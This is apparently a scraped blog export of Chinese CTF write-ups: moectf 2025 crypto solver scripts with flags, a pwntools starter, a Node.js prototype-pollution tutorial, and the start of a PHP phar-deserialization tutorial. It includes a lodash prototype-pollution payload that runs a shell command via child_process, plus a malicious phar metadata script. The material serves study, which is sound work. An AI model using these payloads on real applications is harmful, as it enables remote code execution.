computed_key = 0    for col in range(4):        for row in range(4):            idx = row + col * 4            v = bytes_to_long(flag[idx*2 : idx*2 + 2])            w = pow(v, -2, p_) + 1            leg = pow(w, (p_-1)//2, p_)            bit = ((leg + 1) % p_ // 2)            computed_key = computed_key * 2 + bit    if computed_key == key:        print(&quot;Flag:&quot;, flag)        break    else:        print(f&quot;Computed key &#123;computed_key&#125; does not match expected key &#123;key&#125; for m=&#123;m&#125;&quot;) &quot;&quot;&quot;        Flag: b&#x27;moectf&#123;E@5Y_1eGendre_@nd_@ES*10&#125;&#x27;&quot;&quot;&quot;\n\neasy_gcdfrom Cryptodome.Util.number import long_to_bytesfrom math import gcddef trim_poly(p):    while len(p) &gt; 0 and p[-1] == 0:        p.pop()def poly_mul(a, b, n):    res = [0] * (len(a) + len(b) - 1)    for i in range(len(a)):        for j in range(len(b)):            res[i + j] = (res[i + j] + a[i] * b[j]) % n    trim_poly(res)    return resdef poly_div(dividend, divisor, n):    dividend = dividend[:]    divisor = divisor[:]    trim_poly(dividend)    trim_poly(divisor)    if len(divisor) == 0:        raise ValueError(&quot;Division by zero polynomial&quot;)    if len(dividend) &lt; len(divisor):        return [0], dividend    q = [0] * (len(dividend) - len(divisor) + 1)    for i in range(len(dividend) - len(divisor), -1, -1):        base = divisor[-1]        try:            inv = pow(base, -1, n)            coeff = (dividend[i + len(divisor) - 1] * inv) % n        except ValueError:            print(&quot;Inverse failed, attempting to factor n...&quot;)            g = gcd(base, n)            if 1 &lt; g &lt; n:                p = g                q = n // p                phi_calc = (p - 1) * (q - 1)                if pow(phi_calc, e, n) == enc_phi:                    print(&quot;Phi verified&quot;)                    d_calc = pow(e, -1, phi_calc)                    if pow(d_calc, e, n) == enc_d:                        print(&quot;D verified&quot;)                        flag_int = pow(enc_flag, d_calc, n)                        flag = long_to_bytes(flag_int)                        print(&quot;Flag:&quot;, flag)                    else:                        print(&quot;D not verified&quot;)                else:                    print(&quot;Phi not verified&quot;)            else:                print(&quot;Invalid factor, base=&quot;, base)            import sys            sys.exit(0)        q[i] = coeff        for j in range(len(divisor)):            dividend[i + j] = (dividend[i + j] - coeff * divisor[j]) % n    trim_poly(dividend)    return q, dividenddef poly_gcd(f, g, n):    f = f[:]    g = g[:]    trim_poly(f)    trim_poly(g)    while len(g) &gt; 0:        q, r = poly_div(f, g, n)        f = g        g = r        trim_poly(g)    return fe = 11n = 31166099657280475125475535365831782783093875463247358362475188588947278779261659087382153841735341294644470135658242563894811427195085499234687959821014213884097144683916979145688501653937652132196507641706592058541461494851978378234097501450088696202067780458185699118745693112795064523774316076900622924515043087514299819363383005261432426124907190050031873969718731577577610423430342011833399812571330259167141343053584093492407110726050289284883569075898031613703838488237576756303655189545592872431914967027530453720947545137077577544615857606624432667091058064432254815560483584621525418467954592836937243988243enc_d = 13808910452602719582082356538103809869422886228259509560372242093772427733416618401205696740074353028623820317050192627491660359558892392153999532272857339481298482802886251848703046960504786528793589170539584003383632027476914361574273144291330585735179166690513545471901763697269194228467287645573188775899890375853801796593582850975578804671547453457528686518397397234277841944184055117669277697362945463508844599947716337314398521363079749738943908860398843430518505690528296941997988869732759053587554475692300841912141199296010163641185664377742397777941968394746150611710777000625916609542525700860321528867212enc_phi = 7712799451523923934297438340493818709638100911475880659269081521797448094000671886662453371669377561442768781648787281763679814952312810588749220640616349121013802986627369725105748412428708271146640375251603852154891826036699121824706508396445679193881511426962350499448921650925902083009038656420224517990418144263810608916613943703387804258988710100695100014625921151006914635066745373266932452264209581055597451243351753611834270245107587926127995770837997657200564139159783438755362906511732933456755615781562673235575025697927723044975521898510169824612319133648292886516647301360818651593931313229819219102145enc_flag = 894510730103475572849584456948777906177928458037601077973815297094718207962800841050676989919558783959100151883021776468599378605624814726543232609670826195546342526501910728018180564277901156145145431115589678554941920392777979439329210254339330200637295639957614541733453280727879958971862238162005775966684182859139832583501267115086918765938983728386252082360729694525611252282765144977858082339098241367689924035089953114271269967974794791094625994785638389602317004891381734713155429498571328372671258967340771255624802290579938944569672935599910907961053536945947262426210286500553262856689698523083914877686f = [0] * (e + 1)f[0] = (-enc_d) % nf[e] = 1trim_poly(f)for k in range(1, 11):    poly = [1]    for _ in range(e):        poly = poly_mul(poly, [(-1) % n, e % n], n)    ke = pow(k, e, n)    enc_phi_k = (ke * enc_phi) % n    poly[0] = (poly[0] - enc_phi_k) % n    trim_poly(poly)    gcd_poly = poly_gcd(f, poly, n)    trim_poly(gcd_poly)    if len(gcd_poly) == 2:        lead = gcd_poly[1]        try:            inv_lead = pow(lead, -1, n)        except ValueError:            g = gcd(lead, n)            if 1 &lt; g &lt; n:                p = g                q = n // p                phi_calc = (p - 1) * (q - 1)                if pow(phi_calc, e, n) == enc_phi:                    d_calc = pow(e, -1, phi_calc)                    if pow(d_calc, e, n) == enc_d:                        flag_int = pow(enc_flag, d_calc, n)                        flag = long_to_bytes(flag_int)                        print(&quot;Flag:&quot;, flag)                    else:                        print(&quot;D not verified&quot;)                else:                    print(&quot;Phi not verified&quot;)            else:                print(&quot;Invalid factor for lead&quot;)            continue        const = (gcd_poly[0] * inv_lead) % n        d = (-const) % n        if pow(d, e, n) == enc_d:            flag_int = pow(enc_flag, d, n)            flag = long_to_bytes(flag_int)            print(&quot;Flag:&quot;, flag)            break\n\næ‚äº¤éšæœºæ•°l = 116m = 1 &lt;&lt; la = -233a_mod = a % minv_a = pow(a_mod, -1, m)N = 4567941593066862873653209393990031966807270114415459425382356207107640curr_L_int = N &gt;&gt; lcurr_R_int = N &amp; (m - 1)stack = [(curr_L_int, curr_R_int, 0)]while stack:    L_int, R_int, steps = stack.pop()    if steps == 2025:        original_int = (L_int &lt;&lt; l) | R_int        flag_bytes = original_int.to_bytes(29, &#x27;big&#x27;)        try:            flag = flag_bytes.decode(&#x27;utf-8&#x27;)            if flag.startswith(&#x27;moectf&#123;&#x27;) and flag.endswith(&#x27;&#125;&#x27;):                print(flag)        except UnicodeDecodeError:            pass        continue    S = R_int &gt;&gt; 1    last_bit = R_int &amp; 1    p_S = S.bit_count() % 2    for b in [0, 1]:        prev_L_int = (b &lt;&lt; (l - 1)) + S        diff = (L_int - prev_L_int) % m        prev_R_int = (inv_a * diff) % m        p_R = prev_R_int.bit_count() % 2        if (b ^ p_S ^ p_R) == last_bit:            stack.append((prev_L_int, prev_R_int, steps + 1))    &quot;&quot;&quot;    moectf&#123;I5_1t_Stream0rBlock.?&#125;    &quot;&quot;&quot;\n\n\npwnäºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—from pwn import *from pwn import *                                    # å¯¼å…¥ pwntoolsã€‚context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;) # ä¸€äº›åŸºæœ¬çš„é…ç½®ã€‚ # æœ‰æ—¶æˆ‘ä»¬éœ€è¦åœ¨æœ¬åœ°è°ƒè¯•è¿è¡Œç¨‹åºï¼Œéœ€è¦é…ç½® context.terminalã€‚è¯¦è§å…¥é—¨æŒ‡åŒ—ã€‚ # io = process(&#x27;./pwn&#x27;)             # åœ¨æœ¬åœ°è¿è¡Œç¨‹åºã€‚# gdb.attach(io)                    # å¯åŠ¨ GDBio = connect(&#x27;127.0.0.1&#x27;, 52202)              # ä¸åœ¨çº¿ç¯å¢ƒäº¤äº’ã€‚io.sendline(b&#x27;114511&#x27;)              # ä»€ä¹ˆæ—¶å€™ç”¨ send ä»€ä¹ˆæ—¶å€™ç”¨ sendlineï¼Ÿ payload  = p32(0xdeadbeef)          # p32(0xdeadbeef)ã€b&quot;\\xde\\xad\\xbe\\xef&quot;ã€b&quot;deadbeef&quot; æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ                                    # ä½ çœ‹æ‡‚åŸç¨‹åºè¿™é‡Œçš„æ£€æŸ¥é€»è¾‘äº†å—ï¼Ÿpayload += b&#x27;shuijiangui&#x27;           # strcmp io.sendafter(b&#x27;password.&#x27;, payload) # å‘é€ï¼é€šè¿‡æ‰€æœ‰çš„æ£€æŸ¥ã€‚ io.interactive()                    # æ‰‹åŠ¨æ¥æ”¶ flagã€‚\n\n\nmoectf&#123;THe-b3GlnniNG_0F_forMat85451c15&#125;\n\n","categories":["moectf"],"tags":["moectf 2025"]},{"title":"node.jsåŸå‹é“¾æ±¡æŸ“","url":"/2025/09/13/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","content":"v\nä¸Šå­¦æœŸæ¥è§¦è¿‡node.jsåŸå‹é“¾æ±¡æŸ“æ¼æ´,ä¸è¿‡å½“æ—¶æ²¡å¤ªå­¦æ‡‚,ç°åœ¨å†æ¥æ€»ç»“ä¸€ä¸‹,å¹¶é…ä¸Šä¸€äº›ä¾‹é¢˜\næ¦‚è¦åœ¨jså¯¹è±¡æœ‰ä¸€æ¡æŒ‡å‘åŸå‹å¯¹è±¡çš„é“¾ã€‚å½“è¯•å›¾è®¿é—®å¯¹è±¡çš„å±æ€§æ—¶ï¼Œä¸ä»…åœ¨è¯¥å¯¹è±¡ä¸ŠæŸ¥æ‰¾å±æ€§ï¼Œè¿˜ä¼šåœ¨è¯¥å¯¹è±¡çš„åŸå‹ä¸ŠæŸ¥æ‰¾å±æ€§ï¼Œä»¥åŠåŸå‹çš„åŸå‹ï¼Œä¾æ­¤ç±»æ¨ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåå­—åŒ¹é…çš„å±æ€§æˆ–åˆ°è¾¾åŸå‹é“¾çš„æœ«å°¾ã€‚\nå…³äºåŸå‹é“¾\nåœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªprototypeå±æ€§ï¼Œprototype å±æ€§å¯ä»¥å‘å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚ä¾‹å¦‚:\nobject.prototype.name=value\n\nåœ¨javascriptä¸­,æ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª__proto__å±æ€§ï¼Œè¿™ä¸ªå®ä¾‹å±æ€§æŒ‡å‘å¯¹è±¡çš„åŸå‹å¯¹è±¡(å³åŸå‹)ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¿é—®å¾—åˆ°æŸä¸€å®ä¾‹å¯¹è±¡çš„åŸå‹å¯¹è±¡(ä¸ªäººæ„Ÿè§‰æœ‰ç‚¹åƒpythoné‡Œçš„åŸºç±»)\nobjectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype\n\nä¸åŒå¯¹è±¡æ‰€ç”Ÿæˆçš„åŸå‹é“¾å¦‚ä¸‹(éƒ¨åˆ†)ï¼š\nvar o = &#123;a: 1&#125;;// oå¯¹è±¡ç›´æ¥ç»§æ‰¿äº†Object.prototype// åŸå‹é“¾ï¼š// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// æ•°ç»„éƒ½ç»§æ‰¿äº Array.prototype// åŸå‹é“¾ï¼š// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;  return 2;&#125;// å‡½æ•°éƒ½ç»§æ‰¿äº Function.prototype// åŸå‹é“¾ï¼š// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null\n\nåŸå‹é“¾æ±¡æŸ“åŸç†å¯¹äºè¯­å¥ï¼šobject[a][b] = value å¦‚æœå¯ä»¥æ§åˆ¶aã€bã€valueçš„å€¼ï¼Œå°†aè®¾ç½®ä¸º__proto__ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§ï¼Œå€¼ä¸ºvalueã€‚è¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalue\næ¥ä¸ªç®€å•çš„ä¾‹å­:\nobject1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);\n\n\næœ€ç»ˆä¼šè¾“å‡ºä¸¤ä¸ªHello Worldã€‚ä¸ºä»€ä¹ˆobject2åœ¨æ²¡æœ‰è®¾ç½®fooå±æ€§çš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¼šè¾“å‡ºHello Worldå‘¢ï¼Ÿå°±æ˜¯å› ä¸ºåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­ï¼Œæˆ‘ä»¬å¯¹object1çš„åŸå‹å¯¹è±¡è®¾ç½®äº†ä¸€ä¸ªfooå±æ€§ï¼Œè€Œobject2å’Œobject1ä¸€æ ·ï¼Œéƒ½æ˜¯ç»§æ‰¿äº†Object.prototypeã€‚åœ¨è·å–object2.fooæ—¶ï¼Œç”±äºobject2æœ¬èº«ä¸å­˜åœ¨fooå±æ€§ï¼Œå°±ä¼šå¾€çˆ¶ç±»Object.prototypeä¸­å»å¯»æ‰¾ã€‚è¿™å°±é€ æˆäº†ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œæ‰€ä»¥åŸå‹é“¾æ±¡æŸ“ç®€å•æ¥è¯´å°±æ˜¯å¦‚æœèƒ½å¤Ÿæ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œå°±å¯ä»¥å½±å“åˆ°æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡åŒä¸€ä¸ªåŸå‹çš„å¯¹è±¡ã€‚\nåœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚\nä»€ä¹ˆæƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå“ªäº›æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨åŸå‹é“¾èƒ½è¢«æ”»å‡»è€…ä¿®æ”¹çš„æƒ…å†µå‘¢ï¼Ÿ\næˆ‘ä»¬æ€è€ƒä¸€ä¸‹ï¼Œå“ªäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è®¾ç½®__proto__çš„å€¼å‘¢ï¼Ÿå…¶å®æ‰¾æ‰¾èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œå³å¯ï¼š\n\nå¯¹è±¡merge\nå¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰\n\nä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°ï¼š\nfunction merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key], source[key])        &#125; else &#123;            target[key] = source[key]        &#125;    &#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)\n\nè¿™æ˜¯ä¸€ä¸ªé€’å½’åˆå¹¶å‡½æ•°ï¼ŒæŠŠ source çš„å±æ€§åˆå¹¶åˆ° targetã€‚\néœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼š\nåœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ__proto__ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚\nç»“æœ:\n\nå¯è§object3çš„bæ˜¯ä»åŸå‹ä¸­è·å–åˆ°çš„ï¼Œè¯´æ˜Objectå·²ç»è¢«æ±¡æŸ“äº†\nä¾‹é¢˜ctfshow-338æ¼æ´ä»£ç :\nutils&#x2F;common.js\nfunction copy(object1, object2)&#123;    for (let key in object2) &#123;        if (key in object2 &amp;&amp; key in object1) &#123;            copy(object1[key], object2[key])        &#125; else &#123;            object1[key] = object2[key]        &#125;    &#125;  &#125;\n\nç»å…¸mergeæ–¹æ³•åŸå‹é“¾æ±¡æŸ“ \nroutes&#x2F;login.js\nrouter.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var secert = &#123;&#125;;  var sess = req.session;  let user = &#123;&#125;;  utils.copy(user,req.body);  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;    res.end(flag);  &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#x27;ç™»å½•å¤±è´¥&#x27;+JSON.stringify(user)&#125;);    &#125;&#125;);\n\næˆ‘ä»¬åªè¦æ±¡æŸ“useræ•°ç»„çš„åŸå‹,è®©è¿™ä¸ªåŸå‹å¸¦æœ‰ctfshowè¿™ä¸ªå±æ€§å¹¶ä¸”è®¾ç½®ä¸º36dboy,å°±èƒ½å¾—åˆ°flag\nç™»å½•ç•Œé¢æŠ“åŒ…,ä¼ å…¥\n&#123;&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;\n\nå³å¯æ±¡æŸ“secert,ä½¿å®ƒå­˜åœ¨ä¸€ä¸ªctfshowå±æ€§å¹¶ä¸”å€¼ä¸º36dboy\n\nctfshow&#123;78f9e56a-c10a-4d37-ae7e-ed4653f0b3b8&#125;\n\nCode-Breaking 2018 Thejsapp.js:\nconst fs = require(&#x27;fs&#x27;)const express = require(&#x27;express&#x27;)const bodyParser = require(&#x27;body-parser&#x27;)const lodash = require(&#x27;lodash&#x27;)const session = require(&#x27;express-session&#x27;)const randomize = require(&#x27;randomatic&#x27;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#x27;/static&#x27;, express.static(&#x27;static&#x27;))app.use(session(&#123;    name: &#x27;thejs.session&#x27;,    secret: randomize(&#x27;aA0&#x27;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#x27;views&#x27;, &#x27;./views&#x27;)app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;)app.all(&#x27;/&#x27;, (req, res) =&gt; &#123;    // å®šä¹‰session    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#x27;POST&#x27;) &#123;        // è·å–postæ•°æ®å¹¶åˆå¹¶        data = lodash.merge(data, req.body)        req.session.data = data        // å†å°†dataèµ‹å€¼ç»™session    &#125;    res.render(&#x27;index&#x27;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(&#x27;Example app listening on port 3000!&#x27;))\n\næ¼æ´ä»£ç :\napp.all(&#x27;/&#x27;, (req, res) =&gt; &#123;    // å®šä¹‰session    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#x27;POST&#x27;) &#123;        // è·å–postæ•°æ®å¹¶åˆå¹¶        data = lodash.merge(data, req.body)        req.session.data = data        // å†å°†dataèµ‹å€¼ç»™session    &#125;    res.render(&#x27;index&#x27;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)\n\nlodashæ˜¯ä¸ºäº†å¼¥è¡¥JavaScriptåŸç”Ÿå‡½æ•°åŠŸèƒ½ä¸è¶³è€Œæä¾›çš„ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½é›†ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦ä¸²ã€æ•°ç»„ã€å¯¹è±¡ç­‰æ“ä½œã€‚è¿™ä¸ªWebåº”ç”¨ä¸­ï¼Œä½¿ç”¨äº†lodashæä¾›çš„ä¸¤ä¸ªå·¥å…·ï¼š\n\nlodash.template ä¸€ä¸ªç®€å•çš„æ¨¡æ¿å¼•æ“\nlodash.merge å‡½æ•°æˆ–å¯¹è±¡çš„åˆå¹¶\n\né—®é¢˜å‡ºåœ¨äº†lodashs.mergeå‡½æ•°è¿™é‡Œï¼Œè¿™ä¸ªå‡½æ•°å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚ä½†æ˜¯å…‰å­˜åœ¨æ¼æ´è¿˜ä¸è¡Œï¼Œæˆ‘ä»¬å¾—å¯»æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚å› ä¸ºé€šè¿‡æ¼æ´å¯ä»¥æ§åˆ¶æŸä¸€ç§å®ä¾‹å¯¹è±¡åŸå‹çš„å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»å¯»æ‰¾ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨çš„å±æ€§ã€‚\né¡µé¢æœ€ç»ˆä¼šé€šè¿‡lodash.templateè¿›è¡Œæ¸²æŸ“ï¼Œè·Ÿè¸ªåˆ°lodash&#x2F;template.jsä¸­ã€‚åŸå§‹ä»£ç å¦‚ä¸‹:\nhttps://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165\nvar sourceURL = &#x27;sourceURL&#x27; in options ? &#x27;//# sourceURL=&#x27; + options.sourceURL + &#x27;\\n&#x27; : &#x27;&#x27;;// ...var result = attempt(function() &#123;  return Function(importsKeys, sourceURL + &#x27;return &#x27; + source)  .apply(undefined, importsValues);&#125;);\n\n\nå¦‚å›¾å¯ä»¥çœ‹åˆ°optionsæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒsourceURLæ˜¯é€šè¿‡ä¸‹é¢çš„è¯­å¥èµ‹å€¼çš„ï¼Œoptionsé»˜è®¤æ²¡æœ‰sourceURLå±æ€§ï¼Œæ‰€ä»¥sourceURLé»˜è®¤ä¹Ÿæ˜¯ä¸ºç©ºã€‚\nvar sourceURL = &#x27;sourceURL&#x27; in options ? &#x27;//# sourceURL=&#x27; + options.sourceURL + &#x27;\\n&#x27; : &#x27;&#x27;;\n\nå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿç»™optionsçš„åŸå‹å¯¹è±¡åŠ ä¸€ä¸ªsourceURLå±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶sourceURLçš„å€¼ã€‚\nç»§ç»­å¾€ä¸‹é¢çœ‹ï¼Œæœ€åsourceURLä¼ é€’åˆ°äº†Functionå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å½“ä¸­ï¼š\nvar result = attempt(function() &#123;    return Function(importsKeys, sourceURL + &#x27;return &#x27; + source)      .apply(undefined, importsValues);  &#125;);\n\næœ€ç»ˆå¯ä»¥æ„é€ ä¸€ä¸ªç®€å•çš„Payloadä½œä¸ºä¼ é€’ç»™ä¸»é¡µé¢çš„çš„POSTæ•°æ®(pç‰›çš„payload)ï¼š\n&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;\\n//&quot;&#125;&#125;\n","categories":["node.js"],"tags":["node.js åŸå‹é“¾æ±¡æŸ“"]},{"title":"pharååºåˆ—åŒ–","url":"/2025/09/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"Pharæ˜¯ä»€ä¹ˆ?æ­£å¦‚åŒjavaé‡Œçš„jaråŒ…ä¸€æ ·,ä¸€ä¸ªåº”ç”¨,æ‰“åŒ…è¿›æ‰€æœ‰çš„å¯æ‰§è¡Œ,å¯è®¿é—®çš„æ–‡ä»¶,è®©éƒ¨ç½²çš„è¿‡ç¨‹å˜å¾—ååˆ†ç®€å•ã€‚åœ¨phpä¸­,ç”¨æ¥å¹²è¿™äº‹çš„å°±æ˜¯pharæ–‡ä»¶ã€‚\npharæ˜¯ç±»ä¼¼jarçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ï¼Œé€šè¿‡å°†phpä»£ç æ–‡ä»¶å’Œå…¶ä»–èµ„æºï¼ˆå›¾åƒï¼Œcssç­‰ï¼‰æ‰“åŒ…åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå‹ç¼©æ–‡ä»¶\nPharæ–‡ä»¶çš„ç»“æ„é€šè¿‡è®¿é—®å®˜ç½‘ï¼Œå¾—çŸ¥pharæ–‡ä»¶çš„ç»“æ„ï¼š\n\n\nStub â€”&gt; Phar çš„æ–‡ä»¶å¤´\nmanifest â€”&gt; å‹ç¼©æ–‡ä»¶ä¿¡æ¯\ncontents â€”&gt; å‹ç¼©æ–‡ä»¶å†…å®¹\nsignature â€”&gt; ç­¾å\n\næ¥åˆ†æä¸€ä¸‹è¿™å››ä¸ªéƒ¨åˆ†ï¼š\nStubstubå¯ä»¥ç†è§£ä¸ºæ˜¯Pharæ–‡ä»¶çš„ä¸€ä¸ªæ–‡ä»¶æ ‡è¯†ï¼Œstubæ˜¯ä¸€ä¸ªç®€å•çš„phpæ–‡ä»¶ï¼Œä»–æœ‰ä¸€å®šçš„æ ¼å¼è¦æ±‚\nxxx&lt;?php xxx; __HALT_COMPILER();?&gt;\n\nxxxé‡Œçš„å†…å®¹å¯ä»¥è‡ªå®šä¹‰ï¼Œä½†æ˜¯__HALT_COMPILER();æ˜¯å¿…é¡»çš„ï¼Œæ²¡æœ‰è¿™ä¸€å¥çš„è¯ï¼Œphpæ˜¯è®¤ä¸å‡ºæ¥è¿™ä¸ªpharæ–‡ä»¶çš„\nä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ç•™ä¸‹è¿™ä¸ªæ ‡å¿—ä½ï¼Œæ„é€ ä¸€ä¸ªå›¾ç‰‡æˆ–è€…å…¶ä»–æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Œå¹¶ä¸”è¢« phar è¿™å‡½æ•°è¯†åˆ«åˆ©ç”¨ã€‚\nmanifestmanifesté‡Œå­˜æ”¾çš„æ˜¯æ–‡ä»¶çš„å±æ€§ï¼Œæƒé™ç­‰è¯¦ç»†ä¿¡æ¯ï¼Œè¿™é‡Œé¢åŒ…å«çš„meta-dataæ˜¯æˆ‘ä»¬ä¸»è¦çš„æ”»å‡»åœ°æ–¹ã€‚è¿™é‡Œçš„ Meta-data æ˜¯æˆ‘ä»¬ç”¨æˆ·è‡ªå®šä¹‰çš„ï¼ˆè¯¦ç»†è§ä¸‹å›¾ï¼‰\n\ncontentsè¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹\nsignatureç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š\n\nå‚æ•°æ˜¯å¯é€‰çš„ï¼ˆä¿®æ”¹ç­¾åå‡½æ•°ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“æˆ‘ä»¬æœ€å¥½æ˜¯ä½¿ç”¨è„šæœ¬åˆ›å»º Phar æ–‡ä»¶ï¼Œåˆ›å»ºå¥½ä¹‹åå°±ä¸èƒ½è½»æ˜“ä¿®æ”¹ Phar æ–‡ä»¶ä¸­çš„å†…å®¹äº†ï¼Œå¦åˆ™ç­¾åä¸å†…å®¹å¯¹ä¸ä¸Šã€‚\nåˆ›å»ºpharæ–‡ä»¶ä¸€ä¸ªç®€å•çš„åˆ›å»ºpharæ–‡ä»¶çš„è„šæœ¬\n&lt;?php class test&#123;    public $name=&quot;qwq&quot;;    function __destruct()    &#123;        echo $this-&gt;name;    &#125;&#125;$a = new test();$a-&gt;name=&quot;phpinfo();&quot;;$phartest=new phar(&#x27;test.phar&#x27;,0); //åˆ›å»ºæ—¶åç¼€åå¿…é¡»ä¸ºphar,ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™å¯ä»¥ä¿®æ”¹åç¼€æ¥bypass$phartest-&gt;startBuffering(); //è®¾ç½®ç¼“å†²åŒºï¼Œå‡†å¤‡ Phar çš„å†™æ“ä½œ$phartest-&gt;setMetadata($a);//å°†è‡ªå®šä¹‰çš„ Meta-data 